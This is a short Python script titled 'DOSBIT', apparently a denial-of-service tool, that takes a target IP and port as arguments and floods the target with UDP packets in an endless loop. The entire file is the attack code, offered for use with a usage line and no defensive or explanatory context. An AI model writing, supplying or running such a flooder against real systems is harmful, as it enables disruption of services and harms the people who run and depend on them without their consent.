import sys
import socket


def nota():
    print " \033[93m   DOSBIT  By Buer"
    print "use : python DOSBIT.py targetIP port"

def a(victim,port):
    client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    
    

    while 1:
        client.sendto("Hello".encode(),(victim,port))
        

def main():
    if len(sys.argv) != 3:
        nota()
    else:
        a(sys.argv[1],int(sys.argv[2]))


if __name__ == "__main__":
    main()
    
    
    